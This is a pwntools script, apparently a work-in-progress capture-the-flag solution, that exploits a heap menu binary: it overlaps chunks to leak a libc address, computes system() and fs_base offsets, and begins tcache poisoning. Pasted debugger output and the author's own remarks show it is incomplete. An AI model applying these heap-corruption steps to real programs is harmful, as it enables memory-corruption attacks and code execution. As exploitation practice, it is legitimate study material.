from pwn import * 

binary = "./UwUSpirit_patched"
p = process(binary)
elf = ELF(binary)
libc = ELF('./libc.so.6')
context.binary = binary
context.log_level = 'debug'

s = '''
b *UwU
b *awa
b *QAQ
'''

def add(index, size, content):
    p.sendlineafter(b'> ', b'UwU')
    p.sendlineafter(b'?\n', str(index).encode())
    p.sendlineafter(b'?\n', str(size).encode())
    p.sendafter(b'UwU:\n', content)

def free(index):
    p.sendlineafter(b'> ', b'QAQ')
    p.sendlineafter(b'?\n', str(index).encode())

def show(index):
    p.sendlineafter(b'> ', b'awa')
    p.sendlineafter(b'?\n', str(index).encode())


# first, free 6 chunks to prepare for an unsortedbin
for i in range(1,7):
    print(i)	
    add(i, 0xa0, b'A')

add(7, 0xa0, b'B'*0x30 + p64(0) + p64(0x1f1)) # making fake header 
add(0, 0xa0, b'A') # after the previous chunk 
add(8, 0xa0, b'A') # this becomes unsorted bin later 
add(9, 0xa0, b'A') # this block the top chunk to prevent merging
for i in range(1,7):
    free(i)
#gdb.attach(p, s)    
free(9) # block the top chunk 
free(8) # unsorted bin

payload = 'X' * 0x20
p.sendafter('> ', payload)
free(0) # now we have a modifiable space? 
 
add(1, 0x1e0, b'B' * 0x120) # overflow up to the libc address of the unsortedbin nearby
'''

pwndbg> tele 0x556f567b4700 100
00:0000│  0x556f567b4700 ◂— 0x4141414141414141 ('AAAAAAAA')
... ↓     35 skipped
24:0120│  0x556f567b4820 —▸ 0x7fd66b21ace0 —▸ 0x556f567b4970 ◂— 0
25:0128│  0x556f567b4828 —▸ 0x7fd66b21ace0 —▸ 0x556f567b4970 ◂— 0
'''
# But this corrupted heap
'''
Allocated chunk | PREV_INUSE
Addr: 0x5645986056b0
Size: 0xb0 (with flag bits: 0xb1)

Allocated chunk | IS_MMAPED
Addr: 0x564598605760
Size: 0x4242424242424240 (with flag bits: 0x4242424242424242)
'''


show(1)

leak = p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')
leak = u64(leak)
#print(hex(leak))
libc_base = leak - 0x21ace0
#print(hex(libc.address))
fsbase = libc_base + 0x3b8740
sys_addr = libc_base + libc.sym['system']
fs_0x30 = fsbase + 0x30

# now what I am missing is the arbirary write and read 
free(1)
gdb.attach(p, s)   
add(1, 0x1e0, b'A' * 0x68 + p64(0xb1) + p64(fs_0x30) + b'C' * 0xa0 + p64(0xb1)) # restruct the heap 
add(1, 0x1e0, b'A' * 0x68 + p64(0xb1) + p64(0) + b'C' * 0xa0 + p64(0xb1))
p.interactive()
